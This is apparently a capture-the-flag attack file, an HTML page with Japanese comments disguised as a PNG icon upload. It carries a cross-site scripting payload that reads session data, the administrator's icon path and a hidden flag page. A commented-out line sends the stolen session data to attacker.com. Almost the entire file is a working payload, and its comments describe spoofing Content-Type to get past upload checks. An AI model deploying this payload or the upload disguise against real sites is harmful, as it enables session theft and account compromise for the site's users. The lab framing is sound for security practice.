<!-- 
ポリグロットPNGファイル（HTMLとしても動作）
実際にはPNGファイルのマジックナンバー（89 50 4E 47）で始まる必要があるが、
Content-Typeを偽装することで画像としてアップロードできる可能性がある
-->
<!DOCTYPE html>
<html>
<head>
    <title>XSS Payload</title>
</head>
<body>
    <h1>アイコンアップロード攻撃</h1>
    <script>
        // XSSペイロード
        (function() {
            // セッション情報を取得
            fetch('/session-check')
                .then(res => res.json())
                .then(data => {
                    console.log('Session data:', data);
                    // 外部サーバーに送信（実際の攻撃では）
                    // fetch('https://attacker.com/steal', {
                    //     method: 'POST',
                    //     body: JSON.stringify(data)
                    // });
                });
            
            // 管理者のアイコンパスを取得
            fetch('/api/user-icon/admin')
                .then(res => res.json())
                .then(data => {
                    console.log('Admin icon:', data);
                });
            
            // フラグを探す
            fetch('/flag-hidden')
                .then(res => res.text())
                .then(html => {
                    console.log('Hidden flag page:', html);
                });
        })();
    </script>
</body>
</html>


